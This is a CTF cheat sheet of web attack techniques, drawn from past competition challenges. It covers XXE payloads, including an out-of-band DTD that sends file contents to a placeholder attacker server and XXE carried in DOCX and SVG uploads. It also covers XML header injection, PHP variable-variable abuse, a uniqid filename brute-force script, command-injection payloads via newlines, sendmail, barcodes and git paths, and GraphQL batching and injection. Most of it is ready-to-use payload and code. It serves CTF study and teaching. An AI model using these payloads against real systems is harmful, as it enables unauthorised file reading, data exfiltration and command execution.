# CTF Web - XXE, XML Injection, Command Injection, GraphQL

XXE payloads, XML injection, PHP variable-variable tricks, sequential regex bypasses, command injection, and GraphQL exploitation. For core server-side injection (PHP type juggling, file inclusion, SSTI, SSRF), see [server-side.md](server-side.md).

## Table of Contents
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
  - [SVG XXE via svglib to PNG Pipeline (P.W.N. CTF 2018)](#svg-xxe-via-svglib-to-png-pipeline-pwn-ctf-2018)
- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
- [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
- [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
- [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
  - [String Interpolation Injection](#string-interpolation-injection)

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
Host evil.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

### XXE via DOCX/Office XML Upload (School CTF 2016)

DOCX files are ZIP archives containing XML. Modify `[Content_Types].xml` inside the DOCX to inject XXE payloads that execute when the server parses the uploaded document.

```bash
# Step 1: Create a minimal DOCX and extract it
mkdir docx_exploit && cd docx_exploit
unzip template.docx

# Step 2: Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF

# Step 3: Repackage as DOCX
zip -r exploit.docx '[Content_Types].xml' word/ _rels/

# Step 4: Upload to target
curl -F "file=@exploit.docx" http://target/upload
# Response or error message may contain base64-encoded file contents
```

**Key insight:** Any file format based on ZIP+XML (DOCX, XLSX, PPTX, ODT, SVG+ZIP) can carry XXE payloads. The parser often processes `[Content_Types].xml` first, making it the ideal injection point. Use `php://filter/convert.base64-encode` for binary-safe exfiltration.

### SVG XXE via svglib to PNG Pipeline (P.W.N. CTF 2018)

**Pattern:** A service converts user-uploaded SVG to PNG using `svglib` + `reportlab`. The SVG parser expands external entities before rasterising, so an XXE entity referenced inside a `<text>` element ends up *drawn* onto the PNG.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE foo [<!ENTITY dat SYSTEM "file:///opt/key.txt">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="10mm">
  <text x="10" y="15" font-size="4" fill="red">&dat;</text>
</svg>
```

The resulting PNG contains the flag rendered as visible text. Download the PNG and OCR/eyeball it.

**Key insight:** Any SVG-to-image converter chain (`svglib`, `cairosvg`, `rsvg-convert`, librsvg) resolves XXE entities at parse time, so file contents can be smuggled through the image channel. The content appears in pixels, not metadata — grep is useless; open the image.

**References:** P.W.N. CTF 2018 — SVG2PNG, writeup 12064

---

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)

Application builds XML from HTTP headers (e.g., `X-Forwarded-For`) without sanitization. First-tag-wins XML parsing allows injecting arbitrary elements:

```http
X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
```

Produces: `<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>` -- the XML parser takes the first `<admin>true</admin>`, ignoring the legitimate `<admin>false</admin>` that follows.

**Key insight:** XML injection via HTTP headers when server builds XML from header values without escaping. First-match semantics exploit duplicate tags. Check any header that appears in server responses or logs as structured data (`X-Forwarded-For`, `User-Agent`, `Referer`).

---

## PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)

**Pattern:** PHP's variable variables (`$$key`) allow using a variable's value as the name of another variable. When a loop iterates over GET/POST parameters and assigns them as `$$key = $$value`, supplying `?_200=flag` captures `$flag`'s value into `$_200` before it gets overwritten.

```php
// Vulnerable pattern: loop that processes GET parameters as variable aliases
foreach ($_GET as $key => $value) {
    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
}
// Later: echo $_200;  // outputs the flag
```

```bash
# Supply a "safe" output variable name as key, protected variable name as value
curl "http://target/page.php?_200=flag"
# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
```

**How to find the output variable:** Look for variables beginning with HTTP status codes (e.g., `$_200`, `$_404`) in the source, or any variable echoed to output that starts with an underscore.

**Key insight:** `$$key` creates arbitrary variable aliases; iterating GET/POST params with `$$key = $$value` lets an attacker redirect protected variables (like `$flag`) into any output variable they control by naming the output variable as the key and the secret variable as the value.

---

## PHP uniqid() Predictable Filename (EKOPARTY 2017)

**Pattern:** PHP's `uniqid()` uses `gettimeofday()` internally. The first 8 hex characters encode the Unix timestamp in seconds, making filenames predictable within a bounded time window.

```php
// Vulnerable: uses uniqid() to name an uploaded/generated file
$filename = uniqid() . '_flag.txt';
// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
```

```python
import requests
import time

# Know approximate upload time (from server Date header, challenge hint, etc.)
start_ts = int(time.time()) - 60   # 60 second window before now
end_ts   = int(time.time()) + 10

for ts in range(start_ts, end_ts):
    hex_prefix = format(ts, '08x')
    url = f'http://target/uploads/{hex_prefix}_flag.txt'
    r = requests.get(url)
    if r.status_code == 200:
        print(f"Found: {url}")
        print(r.text)
        break
```

**Narrowing the window:** The server's `Date` response header tells you the server's current time. Record it when triggering file creation; the timestamp in the filename will match that second.

**Key insight:** PHP `uniqid()` first 8 hex chars = Unix timestamp in seconds. The file is fully predictable within a known time window — brute-force is O(seconds in window), typically under 100 requests.

---

## Sequential Regex Replacement Bypass (Tokyo Westerns 2017)

**Pattern:** When a sanitizer applies regex replacements sequentially (not simultaneously), the first replacement can produce a substring that the second replacement should catch — but since the second replacement already ran (or the first runs after the second), the dangerous pattern survives.

```php
// Vulnerable: replacements run in sequence on the same string
$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
```

```text
# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
# Input: <scr<script>ipt>
# Pass 2 strips inner <script> → leaves: <script>
# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
```

```bash
# Practical bypass — embed the dangerous string inside the blocked string:
# If filter strips "script" then strips "on.*=":
curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
# Exact bypass depends on regex — test with variations like:
# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
```

**Key insight:** Sequential regex replacements let pass N reconstruct what pass M already checked. The first replacement produces a pattern the second was designed to catch, but because the second has already run (or the first runs last), the reconstructed dangerous pattern passes through. Always apply sanitization in a single idempotent pass or use a parser-based sanitizer.

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
Common missed: `;` semicolons, backticks, `$()` substitution

### Sendmail Parameter Injection via CGI (SECCON 2015)

When CGI scripts pass user input to `sendmail` via `open()` pipe:

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

Inject shell commands by breaking out of the quoted context:

```bash
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.

### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)

When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:

1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
   ```text
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.

### Git CLI Newline Injection via URL Path (BSidesSF 2026)

**Pattern (gitfab):** A web-based repository viewer shells out to git CLI using backticks: `` `git show "#{path}"` ``. The application sanitizes shell metacharacters (`<`, `>`, `|`, `;`, `&`) but allows newlines. URL-encoded newline (`%0a`) in the path parameter breaks out of the git command and injects arbitrary shell commands.

```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

Decoded, this becomes:
```bash
git show "test"
cat /home/ctf/flag.txt
echo ""
```

```ruby
require 'httparty'

# URL-encode newline injection
path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
puts response.body
```

**Key insight:** Newline (`\n`, `%0a`) is frequently overlooked in command injection filters. While `;`, `|`, and `&` are commonly blocked, newline acts as a command separator in shell and is valid in URLs. Any application that passes URL path components to shell commands via string interpolation (backticks, `system()`, `popen()`) is vulnerable if newlines aren't filtered.

**When to recognize:** Web app interacts with git, svn, or other CLI tools. Source shows shell interpolation with partial sanitization. Test with `%0a` (newline) and `%0d%0a` (CRLF) in URL parameters.

**Defense check:** Does the filter block `\n` (0x0a)? Does it use allowlists instead of blocklists? Does it use `execve()` (no shell) instead of `system()` (shell)?

---

## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)

### Introspection and Schema Discovery

```graphql
# Full schema enumeration (often left enabled in CTFs)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Shortened introspection query
{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}

# Find all mutations
{__schema{mutationType{fields{name,args{name,type{name}}}}}}

# Find hidden types
{__schema{types{name,kind,description}}}
```

### Query Batching and Aliasing for Rate Limit Bypass

```graphql
# Execute same mutation N times in single request via aliases
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
  # ... repeat 1337 times
}

# Or via array batching (if supported):
# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
```

### String Interpolation Injection

```javascript
// Vulnerable server code pattern:
const query = `mutation { doAction(input: "${userInput}") { result } }`;

// Injection payload:
// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
// Resulting query:
// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
```

**Key insight:** GraphQL combines query language power with REST-like endpoints. Three main attack surfaces: (1) introspection reveals the full API schema, (2) query batching/aliasing bypasses rate limits and multiplies actions, (3) string interpolation in server-side query construction enables injection similar to SQLi.

---

*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), and [server-side-exec-2.md](server-side-exec-2.md) for SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, PNG/PHP polyglot upload, and more.*
